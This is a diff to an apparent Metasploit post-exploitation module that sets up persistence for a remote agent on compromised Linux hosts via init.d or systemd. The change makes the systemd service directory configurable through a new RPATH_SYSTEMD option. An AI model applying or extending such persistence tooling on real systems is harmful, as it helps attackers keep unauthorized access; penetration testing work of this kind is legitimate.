@@ -31,6 +31,7 @@
 # Delete persistence script/configurations        => set DEL_PERSISTENCE true
 # Execute one simple remote bash command          => set SINGLE_COM uname -a
 # Use 'systemd' insted of 'init.d' to persiste    => set SYSTEMD true
+# The full remote path of systemd directory       => set RPATH_SYSTEMD /etc/systemd/system
 # Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
@@ -132,6 +133,7 @@ class MetasploitModule < Msf::Post
                                          'SESSION' => '1',             # Default its to run againts session 1
                                          'START_TIME' => '8',          # Default time (sec) to start remote agent
                                          'INIT_PATH' => '/etc/init.d', # Default init.d remote directory full path
+                                         'RPATH_SYSTEMD' => '/etc/systemd/system', # Default systmd directory 
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -150,6 +152,7 @@ class MetasploitModule < Msf::Post
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
                                 OptBool.new('SYSTEMD', [ false, 'Use systemd insted of init.d to persiste our agent?' , false]),
+                                OptString.new('RPATH_SYSTEMD', [ false, 'The full remote path of systemd directory']),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory'])
                         ], self.class) 
 
@@ -187,7 +190,7 @@ def ls_stage1
 #
 if datastore['SYSTEMD'] == true
 
-  serv_path = "/etc/systemd/system"
+  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
   serv_file = "#{serv_path}/persistence.service"
     #
     # Check if persistence its allready active ..
@@ -408,7 +411,7 @@ def ls_stage2
 #
 if datastore['SYSTEMD'] == true
 
-  serv_path = "/etc/systemd/system"
+  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
   serv_file = "#{serv_path}/persistence.service"
     #
     # Check systemd persiste script existance ..
